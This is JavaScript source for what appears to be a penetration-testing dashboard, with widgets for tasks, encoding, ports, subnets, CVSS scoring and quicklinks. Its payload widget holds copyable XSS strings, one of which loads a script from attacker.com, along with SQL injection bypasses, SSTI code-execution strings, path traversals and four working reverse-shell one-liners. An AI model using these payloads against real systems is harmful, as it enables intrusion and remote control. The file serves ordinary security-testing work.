        <span class="quote-author">— Bhavya Morvadiya</span>
      </div>
    `;

    const copyBtn = container.querySelector('.quote-copy-btn');
    if (copyBtn) {
      copyBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        if (typeof QuotesWidget !== 'undefined') {
          QuotesWidget.copyCurrentQuote(container);
          copyBtn.innerHTML = '<span style="font-size:0.68rem;font-weight:700;color:var(--accent);font-family:var(--font-mono);">COPIED</span>';
          setTimeout(() => { copyBtn.innerHTML = copySvg; }, 1200);
        }
      });
    }
  }

  /* 12. TARGET CHECKLIST / TO-DO WIDGET */
  async function renderTodoListWidget(container) {
    let tasks = await StorageService.get('todoList', StorageService.DEFAULTS.todoList);
    let filter = 'all';

    container.innerHTML = `
      <div class="todo-widget-container">
        <div class="todo-widget-subbar">
          <div class="todo-widget-badges">
            <span class="todo-widget-count" id="todo-w-counter">0/0 DONE</span>
            <div class="todo-widget-filter-tabs">
              <button class="todo-w-tab active" data-wfilter="all">All</button>
              <button class="todo-w-tab" data-wfilter="active">Active</button>
              <button class="todo-w-tab" data-wfilter="completed">Done</button>
            </div>
          </div>
          <button class="todo-w-open-drawer" title="Open full drawer panel">
            <span>DRAWER</span>
            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
          </button>
        </div>

        <div class="todo-widget-input-row">
          <input type="text" class="todo-widget-input" placeholder="Add target or checklist item... (Enter)" autocomplete="off" spellcheck="false">
          <button class="todo-widget-add-btn" title="Add item">+</button>
        </div>

        <ul class="todo-widget-list"></ul>
      </div>
    `;

    const listEl = container.querySelector('.todo-widget-list');
    const inputEl = container.querySelector('.todo-widget-input');
    const addBtn = container.querySelector('.todo-widget-add-btn');
    const counterEl = container.querySelector('#todo-w-counter');
    const openDrawerBtn = container.querySelector('.todo-w-open-drawer');
    const filterTabs = container.querySelectorAll('.todo-w-tab');

    if (openDrawerBtn && typeof TodoManager !== 'undefined') {
      openDrawerBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        TodoManager.openPanel();
      });
    }

    async function syncAndRender() {
      const completedCount = tasks.filter(t => t.completed).length;
      counterEl.textContent = `${completedCount}/${tasks.length} DONE`;
      listEl.innerHTML = '';

      const filtered = tasks.filter(t => {
        if (filter === 'active') return !t.completed;
        if (filter === 'completed') return t.completed;
        return true;
      });

      if (filtered.length === 0) {
        listEl.innerHTML = '<li class="todo-w-empty">No items in this view</li>';
        return;
      }

      filtered.forEach(item => {
        const li = document.createElement('li');
        li.className = `todo-w-item ${item.completed ? 'completed' : ''}`;

        const checkBtn = document.createElement('button');
        checkBtn.className = 'todo-w-check';
        if (item.completed) {
          checkBtn.innerHTML = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"></polyline></svg>';
        }
        checkBtn.addEventListener('click', async (e) => {
          e.stopPropagation();
          item.completed = !item.completed;
          await commitTasks();
        });

        const textSpan = document.createElement('span');
        textSpan.className = 'todo-w-text';
        textSpan.textContent = item.text;
        textSpan.addEventListener('click', async (e) => {
          e.stopPropagation();
          item.completed = !item.completed;
          await commitTasks();
        });

        const delBtn = document.createElement('button');
        delBtn.className = 'todo-w-del';
        delBtn.innerHTML = '&times;';
        delBtn.addEventListener('click', async (e) => {
          e.stopPropagation();
          tasks = tasks.filter(t => t.id !== item.id);
          await commitTasks();
        });

        li.appendChild(checkBtn);
        li.appendChild(textSpan);
        li.appendChild(delBtn);
        listEl.appendChild(li);
      });
    }

    async function commitTasks() {
      await StorageService.set('todoList', tasks);
      window.dispatchEvent(new CustomEvent('vapt-todo-change', { detail: { todos: tasks, source: 'widget' } }));
      syncAndRender();
    }

    async function handleAdd() {
      const text = inputEl.value.trim();
      if (!text) return;
      tasks.unshift({
        id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
        text,
        completed: false
      });
      inputEl.value = '';
      await commitTasks();
    }

    addBtn.addEventListener('click', handleAdd);
    inputEl.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        e.preventDefault();
        handleAdd();
      }
    });

    filterTabs.forEach(tab => {
      tab.addEventListener('click', (e) => {
        e.stopPropagation();
        filterTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        filter = tab.dataset.wfilter;
        syncAndRender();
      });
    });

    window.addEventListener('vapt-todo-change', async (e) => {
      if (e.detail && e.detail.source !== 'widget') {
        tasks = e.detail.todos || await StorageService.get('todoList', StorageService.DEFAULTS.todoList);
        syncAndRender();
      }
    });

    syncAndRender();
  }

  /* 13. QUICK PAYLOADS & BYPASSES WIDGET */
  function renderPayloadsWidget(container) {
    const PAYLOAD_DB = {
      xss: [
        { title: 'SVG Onload Alert', code: '<svg onload=alert(1)>' },
        { title: 'Image Tag OnError', code: '"><img src=x onerror=alert(1)>' },
        { title: 'JS Pseudo-protocol', code: 'javascript:alert(document.domain)' },
        { title: 'Remote Hook Script', code: '<script src="//attacker.com/h.js"></script>' },
        { title: 'Iframe JavaScript', code: '<iframe src="javascript:alert(1)">' }
      ],
      sqli: [
        { title: 'Auth Bypass Or 1=1', code: "' OR '1'='1' -- -" },
        { title: 'Union Null Extraction', code: "' UNION SELECT null,version(),null -- -" },
        { title: 'Postgres Error Cast', code: "' AND 1=cast((SELECT version()) as int) --" },
        { title: 'Admin Comment Out', code: "admin' -- -" },
        { title: 'MySQL Sleep Injection', code: "' OR sleep(5) -- -" }
      ],
      ssti: [
        { title: 'Generic 7*7 Probe', code: '{{7*7}}' },
        { title: 'Spring EL Expression', code: '${7*7}' },
        { title: 'Ruby / Twig Template', code: '#{7*7}' },
        { title: 'Jinja2 Subclasses RCE', code: "{{cycler.__init__.__globals__.os.popen('id').read()}}" },
        { title: 'Spring Runtime Calc', code: "*{T(java.lang.Runtime).getRuntime().exec('calc')}" }
      ],
      lfi: [
        { title: 'Linux Passwd Traversal', code: '../../../../etc/passwd' },
        { title: 'Windows Win.ini File', code: '..\\..\\..\\..\\windows\\win.ini' },
        { title: 'PHP Base64 Wrapper', code: 'php://filter/convert.base64-encode/resource=index.php' },
        { title: 'Proc Self Environ', code: '/proc/self/environ' },
        { title: 'Null Byte Bypass', code: '../../../../etc/passwd%00' }
      ],
      cmdi: [
        { title: 'Semicolon Separator', code: '; id;' },
        { title: 'Pipe Direct Exec', code: '| id' },
        { title: 'Subshell Command', code: '$(id)' },
        { title: 'Backtick Execution', code: '`id`' },
        { title: 'Windows Cmd Ampersand', code: '& whoami' }
      ],
      revshell: [
        { title: 'Bash TCP Reverse Shell', code: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' },
        { title: 'Netcat Mkfifo Shell', code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f' },
        { title: 'Python3 Socket PTY', code: "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.2\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'" },
        { title: 'PowerShell TCP Client', code: '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' }
      ]
    };

    let activeCat = 'xss';
    let searchQuery = '';

    container.innerHTML = `
      <div class="payloads-container">
        <div class="payload-nav-row">
          <div class="payload-cat-tabs">
            <button class="p-tab active" data-cat="xss">XSS</button>
            <button class="p-tab" data-cat="sqli">SQLi</button>
            <button class="p-tab" data-cat="ssti">SSTI</button>
            <button class="p-tab" data-cat="lfi">LFI</button>
            <button class="p-tab" data-cat="cmdi">Cmdi</button>
            <button class="p-tab" data-cat="revshell">RevShell</button>
          </div>
          <input type="text" class="payload-search-box" placeholder="Filter..." spellcheck="false" autocomplete="off">
        </div>
        <div class="payload-list"></div>
      </div>
    `;

    const listEl = container.querySelector('.payload-list');
    const tabs = container.querySelectorAll('.p-tab');
    const searchInput = container.querySelector('.payload-search-box');

    function renderList() {
      listEl.innerHTML = '';
      const items = PAYLOAD_DB[activeCat] || [];
      const filtered = items.filter(p => {
        if (!searchQuery) return true;
        return p.title.toLowerCase().includes(searchQuery) || p.code.toLowerCase().includes(searchQuery);
      });

      if (filtered.length === 0) {
        listEl.innerHTML = '<div style="text-align:center;padding:12px;font-size:0.7rem;color:var(--text-subtle);font-family:var(--font-mono);">No payloads found</div>';
        return;
      }

      filtered.forEach(p => {
        const row = document.createElement('div');
        row.className = 'payload-row';
        row.innerHTML = `
          <div class="payload-info">
            <span class="payload-title-mini">${p.title}</span>
            <span class="payload-code">${escapeHtml(p.code)}</span>
          </div>
          <button class="payload-copy-btn" title="Copy payload">COPY</button>
        `;

        const btn = row.querySelector('.payload-copy-btn');
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          navigator.clipboard.writeText(p.code);
          btn.textContent = 'COPIED';
          btn.style.color = '#fff';
          btn.style.background = 'var(--accent)';
          setTimeout(() => {
            btn.textContent = 'COPY';
            btn.style.color = '';
            btn.style.background = '';
          }, 1200);
        });

        listEl.appendChild(row);
      });
    }

    tabs.forEach(tab => {
      tab.addEventListener('click', (e) => {
        e.stopPropagation();
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        activeCat = tab.dataset.cat;
        renderList();
      });
    });

    searchInput.addEventListener('input', (e) => {
      searchQuery = e.target.value.toLowerCase().trim();
      renderList();
    });

    renderList();
  }

  /* 14. FAST ENCODER & HASHES WIDGET */
  function renderEncoderWidget(container) {
    container.innerHTML = `
      <div class="encoder-container">
        <textarea class="encoder-input-box" placeholder="String to encode or decode..." spellcheck="false"></textarea>
        <div class="encoder-actions-row">
          <button class="enc-btn" data-act="b64e">B64 Enc</button>
          <button class="enc-btn" data-act="b64d">B64 Dec</button>
          <button class="enc-btn" data-act="urle">URL Enc</button>
          <button class="enc-btn" data-act="urld">URL Dec</button>
          <button class="enc-btn" data-act="hexe">Hex Enc</button>
          <button class="enc-btn" data-act="hexd">Hex Dec</button>
          <button class="enc-btn" data-act="sha256">SHA-256</button>
        </div>
        <textarea class="encoder-output-box" placeholder="Result output appears here..." readonly spellcheck="false"></textarea>
        <div class="encoder-meta-row">
          <span class="enc-len-badge" id="enc-len-txt">0 bytes</span>
          <button class="enc-copy-btn">COPY RESULT</button>
        </div>
      </div>
    `;

    const inputArea = container.querySelector('.encoder-input-box');
    const outputArea = container.querySelector('.encoder-output-box');
    const lenBadge = container.querySelector('#enc-len-txt');
    const copyBtn = container.querySelector('.enc-copy-btn');
    const buttons = container.querySelectorAll('.enc-btn');

    async function executeOp(action) {
      const val = inputArea.value;
      if (!val) {
        outputArea.value = '';
        lenBadge.textContent = '0 bytes';
        return;
      }

      let res = '';
      try {
        if (action === 'b64e') {
          res = btoa(unescape(encodeURIComponent(val)));
        } else if (action === 'b64d') {
          res = decodeURIComponent(escape(atob(val.trim())));
        } else if (action === 'urle') {
          res = encodeURIComponent(val);
        } else if (action === 'urld') {
          res = decodeURIComponent(val);
        } else if (action === 'hexe') {
          res = Array.from(new TextEncoder().encode(val)).map(b => b.toString(16).padStart(2, '0')).join('');
        } else if (action === 'hexd') {
          const clean = val.replace(/\s+/g, '');
          const bytes = [];
          for (let i = 0; i < clean.length; i += 2) {
            bytes.push(parseInt(clean.substr(i, 2), 16));
          }
          res = new TextDecoder().decode(new Uint8Array(bytes));
        } else if (action === 'sha256') {
          const msgBuffer = new TextEncoder().encode(val);
          const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
          const hashArray = Array.from(new Uint8Array(hashBuffer));
          res = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        }
      } catch (err) {
        res = `[Error] ${err.message}`;
      }

      outputArea.value = res;
      lenBadge.textContent = `${new TextEncoder().encode(res).length} bytes`;
    }

    buttons.forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        executeOp(btn.dataset.act);
      });
    });

    copyBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (!outputArea.value) return;
      navigator.clipboard.writeText(outputArea.value);
      copyBtn.textContent = 'COPIED';
      setTimeout(() => { copyBtn.textContent = 'COPY RESULT'; }, 1200);
    });
  }

  /* 15. CRITICAL PORTS CHEAT WIDGET */
  function renderCommonPortsWidget(container) {
    const PORTS_DATA = [
      { port: 21, service: 'FTP', notes: 'Anonymous login, vsftpd, credentials' },
      { port: 22, service: 'SSH', notes: 'Key auth, banner grab, user enum' },
      { port: 23, service: 'Telnet', notes: 'Cleartext protocol, embedded routers' },
      { port: 25, service: 'SMTP', notes: 'VRFY / EXPN enum, open mail relay' },
      { port: 53, service: 'DNS', notes: 'AXFR zone transfer, subdomain recon' },
      { port: 80, service: 'HTTP', notes: 'Web vulnerabilities, ffuf directory fuzz' },
      { port: 88, service: 'Kerberos', notes: 'AS-REP Roasting, Kerberoasting SPNs' },
      { port: 110, service: 'POP3', notes: 'Cleartext email retrieval' },
      { port: 135, service: 'MSRPC', notes: 'RPC endpoint mapper, null session' },
      { port: 139, service: 'NetBIOS', notes: 'nmblookup, SMB workgroups' },
      { port: 443, service: 'HTTPS', notes: 'TLS cipher recon, Web apps, APIs' },
      { port: 445, service: 'SMB', notes: 'CrackMapExec, null sessions, EternalBlue' },
      { port: 1433, service: 'MSSQL', notes: 'xp_cmdshell RCE, Impacket mssqlclient' },
      { port: 1521, service: 'Oracle', notes: 'TNS listener, odat, SID brute force' },
      { port: 2049, service: 'NFS', notes: 'showmount -e, no_root_squash mount' },
      { port: 3306, service: 'MySQL', notes: 'User enumeration, UDF RCE, file dump' },
      { port: 3389, service: 'RDP', notes: 'BlueKeep, xfreerdp, NLA requirement' },
      { port: 5432, service: 'PostgreSQL', notes: 'COPY FROM PROGRAM remote code exec' },
      { port: 5985, service: 'WinRM', notes: 'Evil-WinRM, PowerShell remote exec' },
      { port: 6379, service: 'Redis', notes: 'Unauth write authorized_keys / crontab' },
      { port: 8080, service: 'Alt-HTTP', notes: 'Tomcat manager, Jenkins, proxy' },
      { port: 9200, service: 'Elastic', notes: 'Unauthenticated REST API data dump' }
    ];

    let filterQuery = '';

    container.innerHTML = `
      <div class="ports-widget-container">
        <div class="ports-search-row">
          <input type="text" class="ports-search-input" placeholder="Search port number or protocol (e.g. 445, smb)..." spellcheck="false" autocomplete="off">
        </div>
        <div class="ports-list-scroll"></div>
      </div>
    `;

    const listEl = container.querySelector('.ports-list-scroll');
    const searchInput = container.querySelector('.ports-search-input');

    function renderList() {
      listEl.innerHTML = '';
      const filtered = PORTS_DATA.filter(p => {
        if (!filterQuery) return true;
        return p.port.toString().includes(filterQuery) ||
               p.service.toLowerCase().includes(filterQuery) ||
               p.notes.toLowerCase().includes(filterQuery);
      });

      if (filtered.length === 0) {
        listEl.innerHTML = '<div style="text-align:center;padding:12px;font-size:0.7rem;color:var(--text-subtle);font-family:var(--font-mono);">No ports matching filter</div>';
        return;
      }

      filtered.forEach(p => {
        const row = document.createElement('div');
        row.className = 'port-item-row';
        row.title = 'Click to copy port number';
        row.innerHTML = `
          <span class="port-num-badge">:${p.port}</span>
          <span class="port-service-tag">${p.service}</span>
          <span class="port-desc-text">${p.notes}</span>
        `;
        row.addEventListener('click', (e) => {
          e.stopPropagation();
          navigator.clipboard.writeText(p.port.toString());
          const badge = row.querySelector('.port-num-badge');
          badge.textContent = 'COPIED';
          setTimeout(() => { badge.textContent = `:${p.port}`; }, 1000);
        });
        listEl.appendChild(row);
      });
    }

    searchInput.addEventListener('input', (e) => {
      filterQuery = e.target.value.toLowerCase().trim();
      renderList();
    });

    renderList();
  }

  /* 16. SUBNET & CIDR REFERENCE WIDGET */
  function renderSubnetsWidget(container) {
    const SUBNET_TABLE = [
      { cidr: '/30', mask: '255.255.255.252', hosts: '2' },
      { cidr: '/29', mask: '255.255.255.248', hosts: '6' },
      { cidr: '/28', mask: '255.255.255.240', hosts: '14' },
      { cidr: '/27', mask: '255.255.255.224', hosts: '30' },
      { cidr: '/26', mask: '255.255.255.192', hosts: '62' },
      { cidr: '/25', mask: '255.255.255.128', hosts: '126' },
      { cidr: '/24', mask: '255.255.255.0',   hosts: '254' },
      { cidr: '/16', mask: '255.255.0.0',     hosts: '65,534' }
    ];

    container.innerHTML = `
      <div class="subnet-widget-container">
        <div class="subnet-input-group">
          <input type="text" class="subnet-input" value="/24" maxlength="3" spellcheck="false" autocomplete="off">
          <div class="subnet-result-badge" id="sub-res-badge">255.255.255.0 • 254 Hosts</div>
        </div>
        <div class="subnet-quick-table"></div>
        <div class="subnet-rfc-strip">
          <span>10.0.0.0/8</span>
          <span>172.16.0.0/12</span>
          <span>192.168.0.0/16</span>
        </div>
      </div>
    `;

    const input = container.querySelector('.subnet-input');
    const resBadge = container.querySelector('#sub-res-badge');
    const tableEl = container.querySelector('.subnet-quick-table');

    SUBNET_TABLE.forEach(item => {
      const pill = document.createElement('div');
      pill.className = 'subnet-pill';
      pill.innerHTML = `<span class="cidr">${item.cidr}</span><span class="hosts">${item.hosts} hosts</span>`;
      pill.addEventListener('click', (e) => {
        e.stopPropagation();
        input.value = item.cidr;
        resBadge.textContent = `${item.mask} • ${item.hosts} Hosts`;
      });
      tableEl.appendChild(pill);
    });

    input.addEventListener('input', () => {
      let val = input.value.replace(/[^0-9]/g, '');
      const num = parseInt(val, 10);
      if (num >= 0 && num <= 32) {
        const total = Math.pow(2, 32 - num);
        const usable = num >= 31 ? (num === 31 ? 2 : 1) : Math.max(0, total - 2);
        resBadge.textContent = `${usable.toLocaleString()} Usable • ${total.toLocaleString()} Total`;
      } else {
        resBadge.textContent = 'Enter /1 to /32';
      }
    });
  }

  /* 17. CVSS v3.1 CALCULATOR WIDGET */
  function renderCvssWidget(container) {
    const vector = {
      AV: 'N', // N, A, L, P
      AC: 'L', // L, H
      PR: 'N', // N, L, H
      UI: 'N', // N, R
      S:  'U', // U, C
      C:  'H', // N, L, H
      I:  'H', // N, L, H
      A:  'H'  // N, L, H
    };

    container.innerHTML = `
      <div class="cvss-widget-container">
        <div class="cvss-score-bar">
          <span class="cvss-score-pill critical" id="cvss-score-val">9.8 CRIT</span>
          <span class="cvss-vector-mini" id="cvss-vec-txt">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span>
          <button class="cvss-copy-vector-btn">COPY</button>
        </div>
        <div class="cvss-selectors-scroll"></div>
      </div>
    `;

    const scorePill = container.querySelector('#cvss-score-val');
    const vecTxt = container.querySelector('#cvss-vec-txt');
    const copyBtn = container.querySelector('.cvss-copy-vector-btn');
    const scrollEl = container.querySelector('.cvss-selectors-scroll');

    const METRICS = [
      { id: 'AV', label: 'AV', opts: ['N', 'A', 'L', 'P'] },
      { id: 'AC', label: 'AC', opts: ['L', 'H'] },
      { id: 'PR', label: 'PR', opts: ['N', 'L', 'H'] },
      { id: 'UI', label: 'UI', opts: ['N', 'R'] },
      { id: 'S',  label: 'Scope', opts: ['U', 'C'] },
      { id: 'C',  label: 'Conf', opts: ['N', 'L', 'H'] },
      { id: 'I',  label: 'Integ', opts: ['N', 'L', 'H'] },
      { id: 'A',  label: 'Avail', opts: ['N', 'L', 'H'] }
    ];

    METRICS.forEach(m => {
      const row = document.createElement('div');
      row.className = 'cvss-metric-row';
      row.innerHTML = `<span class="cvss-metric-name">${m.label}</span><div class="cvss-opt-pills" id="opt-${m.id}"></div>`;
      const pillsContainer = row.querySelector(`#opt-${m.id}`);

      m.opts.forEach(opt => {
        const btn = document.createElement('button');
        btn.className = `cvss-opt-btn ${vector[m.id] === opt ? 'active' : ''}`;
        btn.textContent = opt;
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          vector[m.id] = opt;
          pillsContainer.querySelectorAll('.cvss-opt-btn').forEach(b => b.classList.remove('active'));
          btn.classList.add('active');
          updateCvssScore();
        });
        pillsContainer.appendChild(btn);
      });

      scrollEl.appendChild(row);
    });

    function updateCvssScore() {
      // Metric weights defined in CVSS v3.1 specification
      const weightAV = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 }[vector.AV];
      const weightAC = { L: 0.77, H: 0.44 }[vector.AC];
      const weightUI = { N: 0.85, R: 0.62 }[vector.UI];
      const scopeChanged = vector.S === 'C';
      const weightPR = scopeChanged
        ? { N: 0.85, L: 0.68, H: 0.50 }[vector.PR]
        : { N: 0.85, L: 0.62, H: 0.27 }[vector.PR];

      const weightC = { N: 0, L: 0.22, H: 0.56 }[vector.C];
      const weightI = { N: 0, L: 0.22, H: 0.56 }[vector.I];
      const weightA = { N: 0, L: 0.22, H: 0.56 }[vector.A];

      const iss = 1 - ((1 - weightC) * (1 - weightI) * (1 - weightA));
      let impact = 0;
      if (scopeChanged) {
        impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
      } else {
        impact = 6.42 * iss;
      }

      const exploitability = 8.22 * weightAV * weightAC * weightPR * weightUI;
      let score = 0;
      if (impact > 0) {
        if (scopeChanged) {
          score = Math.min(10, Math.ceil(Math.min(1.08 * (impact + exploitability), 10) * 10) / 10);
        } else {
          score = Math.min(10, Math.ceil(Math.min(impact + exploitability, 10) * 10) / 10);
        }
      }

      const vecStr = `CVSS:3.1/AV:${vector.AV}/AC:${vector.AC}/PR:${vector.PR}/UI:${vector.UI}/S:${vector.S}/C:${vector.C}/I:${vector.I}/A:${vector.A}`;
      vecTxt.textContent = vecStr;

      let sev = 'low';
      let sevLabel = 'LOW';
      if (score >= 9.0) { sev = 'critical'; sevLabel = 'CRIT'; }
      else if (score >= 7.0) { sev = 'high'; sevLabel = 'HIGH'; }
      else if (score >= 4.0) { sev = 'medium'; sevLabel = 'MED'; }

      scorePill.className = `cvss-score-pill ${sev}`;
      scorePill.textContent = `${score.toFixed(1)} ${sevLabel}`;
    }

    copyBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      navigator.clipboard.writeText(vecTxt.textContent);
      copyBtn.textContent = 'COPIED';
      setTimeout(() => { copyBtn.textContent = 'COPY'; }, 1200);
    });

    updateCvssScore();
  }

  function renderQuicklinksWidget(container) {
    const links = [
      { 
        name: 'Payloads', 
        url: 'https://github.com/swisskyrepo/PayloadsAllTheThings', 
        svg: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>' 
      },
      { 
        name: 'SecLists', 
        url: 'https://github.com/danielmiessler/SecLists', 
        svg: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>' 
      },
      { 
        name: 'GTFOBins', 
        url: 'https://gtfobins.github.io', 
        svg: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>' 
      },
      { 
        name: 'HackTricks', 
        url: 'https://book.hacktricks.xyz', 
        svg: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg>' 
      },
      { 
        name: 'Exploit-DB', 
        url: 'https://www.exploit-db.com', 
        svg: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>' 
      },
      { 
        name: 'CyberChef', 
        url: 'https://gchq.github.io/CyberChef/', 
        svg: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>' 
      },
      { 
        name: 'DuckDuckGo', 
        url: 'https://duckduckgo.com', 
        svg: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>' 
      },
      { 
        name: 'Torch', 
        url: 'http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion', 
        svg: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>' 
      }
    ];

    const list = document.createElement('div');
    list.className = 'quicklinks-grid';
    links.forEach(l => {
      const a = document.createElement('a');
      a.className = 'quicklink-item';
      a.href = l.url;
      a.target = '_blank';
      a.rel = 'noreferrer noopener';
      a.innerHTML = `<span class="ql-icon">${l.svg}</span><span class="ql-name">${l.name}</span>`;
      list.appendChild(a);
    });
    container.appendChild(list);
  }

  async function renderNotesWidget(container) {
    const savedNotes = await StorageService.get('notesContent', StorageService.DEFAULTS.notesContent);
    const textarea = document.createElement('textarea');
    textarea.className = 'notes-textarea';
    textarea.placeholder = 'Engagement targets, scratchpad, or payloads...';
    textarea.value = savedNotes;
    container.appendChild(textarea);
  }

  async function renderCountdownWidget(container) {
    const savedTitle = await StorageService.get('countdownTitle', 'CTF / Engagement Deadline');
    const mode = await StorageService.get('countdownMode', 'date');
    const sprintMins = await StorageService.get('countdownSprintMins', 45);
    const sprintRunning = await StorageService.get('countdownSprintRunning', false);

    container.innerHTML = `
      <div class="countdown-widget-inner view-timer">
        <!-- Main Display View -->
        <div class="countdown-main-view">
          <div class="countdown-header-row">
            <div class="countdown-title-wrap" title="Double-click to edit target">
              <span class="countdown-icon">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <circle cx="12" cy="12" r="6"></circle>
                  <circle cx="12" cy="12" r="2"></circle>
                </svg>
              </span>
              <span class="countdown-title" id="cd-title-text">${escapeHtml(savedTitle)}</span>
            </div>
            <div class="countdown-header-actions">
              <span class="countdown-badge" id="cd-status-badge">LIVE</span>
              <button class="countdown-ctrl-btn countdown-sprint-btn" id="cd-sprint-toggle-btn" type="button" title="Start / Pause Timer" style="${mode === 'sprint' ? '' : 'display:none;'}">
                ${sprintRunning 
                  ? '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>' 
                  : '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><polygon points="6 4 20 12 6 20 6 4"></polygon></svg>'}
              </button>
              <button class="countdown-ctrl-btn countdown-sprint-btn" id="cd-sprint-reset-btn" type="button" title="Reset Sprint Timer" style="${mode === 'sprint' ? '' : 'display:none;'}">
                <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                  <polyline points="1 4 1 10 7 10"></polyline>
                  <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"></path>
                </svg>
              </button>
              <button class="countdown-ctrl-btn countdown-gear-btn" id="cd-gear-btn" type="button" title="Configure Target & Deadline">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="3"></circle>
